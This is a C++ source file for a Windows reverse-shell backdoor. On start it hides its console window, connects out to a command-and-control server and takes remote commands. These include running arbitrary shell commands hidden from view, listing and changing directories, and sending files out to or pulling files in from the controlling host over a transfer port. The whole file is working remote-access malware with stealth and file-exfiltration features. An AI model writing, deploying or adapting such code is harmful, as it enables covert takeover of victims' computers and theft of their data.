//Main headers

#include <WinSock2.h>  // Socket connection
#include <windows.h>	// Used for WinApi calls
#include <ws2tcpip.h>	// TCP-IP connection
#include <stdio.h>		
#include <string.h>
#include <fstream>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#define LENGTH 1024
// debug headers
#include <iostream>
#include <string>
#include <vector>
#pragma warning(disable:4996) 
#pragma once


void whoami(char* return_val) {
	
	DWORD bufferlen = 257;
	
	GetUserName(return_val, &bufferlen);
}

std::vector<std::string> read_directory(std::string folder)
{
	std::vector<std::string> names;
	std::string search_path = folder+ "\\*";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
		
			if (fd.cFileName[0] != '.') {

				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {	// it's a directory if true
					std::string val = "";
					val = fd.cFileName;
					val += "	<DIR>";
					names.push_back(val);
				}
				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {   // it's a file if true
					names.push_back(fd.cFileName);
				}
			}
			
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}

std::string getCurrentDirectory() {

	DWORD bufferlen = 257;
	TCHAR tempVar[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, tempVar);
	//strcat(returnval, tempVar);
	//std::string return_val = tempVar;
	return (std::string) tempVar;
}

std::string get_ls() {
	
	std::string current_directory;
	current_directory = getCurrentDirectory();
	std::string path(current_directory);

	std::vector<std::string> result = read_directory(path);
	
	std::string result_str= "\n";
	for (std::string str : result) {
		result_str += str;
		result_str += '\n';
	}

	std::cout << "\n" << result_str.size() << std::endl;
	return result_str;
	
}

void get_goal_dir(char* command, char* return_val) {
	char goal_dir[257] = "";

	int j = 0;
	for (int i = 3; i < 1024; i++) {
		if (command[i] != '\0') {
			goal_dir[j++] = command[i];
		}
		else
			break;
	}
	strcat(return_val, goal_dir);
}

std::string change_directory(char *command) {
	char current_dir[257] = "";
	
	char goal_dir[1000] = "";
	
	get_goal_dir(command, goal_dir);
	
	char result[257] = "";
	std::string result_str = "";
	if (!SetCurrentDirectory(goal_dir)) {
		result_str = "Could not change the directory";
		strcpy(result, result_str.c_str());
	}
	else {
		result_str = "Working directory has changed...";
		strcpy(result, result_str.c_str());
	}

	//strcat(return_val, result);
	return result_str;
}

SOCKET connect(char *host, int port) {
	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in addr;									// Windows data struct which contains all the 
	addr.sin_family = AF_INET;							// details about IP family, address etc.
	addr.sin_addr.s_addr = inet_addr(host);				// should be ip address of CnC server
	addr.sin_port = htons(port);						// should be the port of CnC server
	
	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		std::cout << "Can't connect" << std::endl;
		::exit(0);
	}
	return tcpsock;
}

void send_file(SOCKET tcp_sock, const char *filename) {
	std::cout << "Connected..." << std::endl;
	Sleep(1500);
	char sdbuf[LENGTH];			//1024
	char buffer[256];	
	int n;
	

	printf("Sending %s to the server...", filename);
	if (FILE* fs2 = fopen(filename, "rb")) {
		std::cout << "File exists" << std::endl;
		send(tcp_sock, "T", sizeof(char), 0);

		FILE* fs = fopen(filename, "rb");

		std::cout << "Filename:" << filename << std::endl;

		std::cout << "\nFS contains:" << fs << std::endl;
		if (fs == NULL)
			printf("Error: File %s is not found...", filename);

		::memset(sdbuf, 0, LENGTH);
		int fs_block_sz;
		while ((fs_block_sz = fread(sdbuf, sizeof(char), LENGTH, fs)) > 0) {
			if (send(tcp_sock, sdbuf, fs_block_sz, 0) < 0) {
				std::cout << "Error occurred while sending the file..." << std::endl;
				break;
			}
			else
				std::cout << "Sending..." << std::endl;
			::memset(sdbuf, 0, LENGTH);
		}
		
		shutdown(tcp_sock, 2);
		closesocket(tcp_sock);
	}
	else {
		send(tcp_sock, "F", sizeof(char), 0);
		std::cout << "Couldn't open file make sure it exists in the working directory" << std::endl;
		closesocket(tcp_sock);
	}

}

std::string get_filename(std::string command) {
	
	return command.substr(command.find(' ') + 1, command.size());
}

void clean_buffer(char* buffer, int buffer_size, char* commandReceived, int cmd_size) {
	memset(buffer, 0, buffer_size);
	memset(commandReceived, 0, cmd_size);
}

bool contains_cmd(std::string cmd, std::string word) {

	for (int i = 0; i < word.length(); i++)
		if (cmd[i] != word[i])
			return false;

	return true;
}

void get_file(SOCKET tr_sock, const char* filename) {
	
	std::cout << "Connected" << std::endl;
	Sleep(1500);
	char rcvbuf[LENGTH];
	std::fstream file;
	file.open(filename, std::ios::out);
	if (!file) {
		send(tr_sock, "F", sizeof(char), 0);
	}
	FILE* fr = fopen(filename, "wb");
	if (fr != NULL) {
		send(tr_sock, "T", sizeof(char), 0);

		memset(rcvbuf, 0, LENGTH);

		int fr_block_size = 0;
		while ((fr_block_size = recv(tr_sock, rcvbuf, LENGTH, 0)) > 0) {
			int wrt_size = fwrite(rcvbuf, sizeof(char), fr_block_size, fr);
			if (wrt_size < fr_block_size) {
				std::cout << "Failed to write to file" << std::endl;
			}
			if (fr_block_size != 1024) {
				break;
			}
		}
		if (fr_block_size < 0) {
			std::cout << "Failed to receive..." << std::endl;
 		}
		printf("File received...");
		fclose(fr);
	}
}

void mkdir(char* buffer, const char* file_name) {
	CreateDirectory(file_name, NULL);

	strcat(buffer, "[*] Directory is created...");
}

void exec(char* return_val, const char* command) {

	if (32 >= (int)(ShellExecute(NULL, "open", command, NULL, NULL, SW_HIDE))){
		strcat(return_val, "[-] Couldn't execute the command...");
	}
	else {
		strcat(return_val, "\n[*] Executed...");
	}
}

std::string exec_terminal_cmd(std::string terminal_cmd) {

	system((terminal_cmd +" > temp.txt").c_str());

	std::ifstream ifs("temp.txt");
	std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
	ifs.close(); // must close the inout stream so the file can be cleaned up
	if (std::remove("temp.txt") != 0) {
		perror("Error deleting temporary file");
	}
	return ret;
}

void send_response(SOCKET tcp_sock,const char* buffer, int buffer_length) {
	
	std::string length = std::to_string(buffer_length);
	std::cout << length.length() << std::endl;
	std::cout << length << std::endl;

	send(tcp_sock, length.c_str() , length.length(), 0);

	Sleep(2000);
	send(tcp_sock, buffer, strlen(buffer) + 1, 0);
}

void revShell() {

	WSADATA wsaver;						
	WSAStartup(MAKEWORD(2, 2), &wsaver);
	
	int tr_port = 8001;		// transfer port			
	
	char host[30] = "127.0.0.1";
	int port = 8080;
	SOCKET tcpsock = connect(host, port);
	
	std::cout << "[+] Connected to client. Waiting for incoming command..." << std::endl;

	char commandReceived[DEFAULT_BUFLEN] = "";
	char buffer[5000] = "";
	std::string response_str = "";

	while (true) {

		clean_buffer(buffer, 5000, commandReceived, DEFAULT_BUFLEN);

		int result = recv(tcpsock, commandReceived, DEFAULT_BUFLEN, 0); // result = length of command
		std::cout << commandReceived << std::endl;
						
		std::string command_str(commandReceived);
		std::cout <<"Received command str: " << commandReceived << std::endl;

		if (strcmp(commandReceived, "Check") != 0) {

			int m = 0;
			if (strcmp(commandReceived, "whoami") == 0) {
				std::cout << "Command parsed: whoami" << std::endl;
				whoami(buffer);
				response_str = buffer;
			}
			else if (strcmp(commandReceived, "pwd") == 0) {
				std::cout << "Command parsed: pwd" << std::endl;
				response_str = getCurrentDirectory();
				//std::cout << "Length of received command: " << result << std::endl;
				//getCureentDirectory();
			}
			else if (contains_cmd(command_str, "cd")) {
				std::cout << "Command parsed: cd" << std::endl;
				response_str = change_directory(commandReceived);
			}
				
			else if (contains_cmd(command_str, "cp")) {
				std::cout << "Command parsed: cp" << std::endl;

				std::string filename = get_filename(command_str);
				
				send_file(connect(host, tr_port), filename.c_str());
				continue;
			}
			else if (contains_cmd(command_str, "send")) {
				std::cout << "Command parsed: send" << std::endl;

				std::string filename = get_filename(command_str);
				std::cout << filename << std::endl;

				get_file(connect(host, tr_port), filename.c_str());
				continue;
			}

			else if (strcmp(commandReceived, "exit") == 0) {
				std::cout << "Command parsed: exit" << std::endl;
				strcat(buffer, "Exiting...");
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(commandReceived, 0, sizeof(commandReceived));
				closesocket(tcpsock);
				WSACleanup();
				::exit(0);
			}
			else if (strcmp(commandReceived, "sysinfo") == 0) {
				std::cout << "Command parsed: sysinfo" << std::endl;
			}
			else if (strcmp(commandReceived, "ls") == 0) {
				std::cout << "Command parsed: ls" << std::endl;
				response_str = get_ls();
				
				std::cout << response_str << std::endl;					
			}
			else if (contains_cmd(commandReceived, "mkdir")) {
				std::cout << "Command parsed: mkdir" << std::endl;
				std::string file_name = get_filename(command_str);
				mkdir(buffer, file_name.c_str());
				response_str = buffer;
			}
			else if (contains_cmd(commandReceived, "execute -c")) {
				std::cout << "Command parsed: execute -c" << std::endl;
				std::string terminal_cmd = command_str.substr(command_str.find("-c") + 2, command_str.length());
				response_str = exec_terminal_cmd(terminal_cmd);
				
			}
			else if (contains_cmd(commandReceived, "execute")) {
				std::cout << "Command parsed: execute" << std::endl;
				std::string exe_cmd = command_str.substr(command_str.find(' ') + 1, command_str.length());

				exec(buffer, exe_cmd.c_str());
				response_str = buffer;
			}
				
			else if (strcmp(commandReceived, "") == 0) {
				closesocket(tcpsock);
				::exit(0);
			}

			else {
				std::cout << commandReceived << std::endl;
				strcat(buffer, "Command Not Found..\n");
				std::cout << buffer << std::endl;
			}

			// strcat(buffer, "\n");
			response_str += "\n";
			send_response(tcpsock, response_str.c_str(), response_str.length());
			// send_respond(tcpsock, buffer, strlen(buffer) + 1);

			//send(tcpsock, buffer, strlen(buffer) + 1, 0);
			
		}
		
	}

	closesocket(tcpsock);
	WSACleanup();
	::exit(0);
}

// Main function

std::string execute_cmd() {
    system("powershell ls > temp.txt");
 
    std::ifstream ifs("temp.txt");
    std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
    ifs.close(); // must close the inout stream so the file can be cleaned up
    if (std::remove("temp.txt") != 0) {
        perror("Error deleting temporary file");
    }
    return ret;
}

int main() {

	HWND stealth;		// declare a windows handle
	AllocConsole();		// allocate a new console
	stealth = FindWindowA("ConsoleWindowClass", NULL);	// Find the previous Window handler and hide/show the 
	// window depending upon the next command
	ShowWindow(stealth, SW_HIDE); // SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = hide the console

	revShell();
	return 0;
}

